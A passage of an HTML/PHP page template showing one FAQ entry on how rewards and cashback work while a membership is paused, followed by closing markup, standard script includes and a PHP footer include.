                              <div class="dark-gray">
                                 <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                    <hr aria-hidden="true" class="w_8Gn9">
                                    <div class="expand-collapse-header flex justify-between items-center w-100">
                                       <h3 class="w-100 ma0 pa3 f5 lh-copy normal">What happens to rewards/cashback while a membership is in pause state?</h3>
                                       <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="What happens to rewards/cashback while a membership is in pause state?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                    </div>
                                    <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                       <div class="ph3 pb4 pt1">
                                          <div class="gray">
                                             <p>a. Members can’t save or earn any additional rewards on purchases
                                                made during the pause period.
                                             </p>
                                             <p>b. Members can use their existing accumulated rewards during the pause
                                                period.
                                             </p>
                                          </div>
                                       </div>
                                    </div>
                                 </section>
                                 <hr aria-hidden="true" class="w_8Gn9">
                              </div>
                           </section>
                           
                        </div>
                     </div>
                  </div>
               </div>
               <div class="bg-black-20 absolute--fill" id="backgroundTopNav" style="z-index:9998"></div>
            </main>
         </div>
      </div>
   </div>

</div> -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="<?php echo $folder_path;?>/js/colpas.js"></script>
<?php
include('footer-new.php');
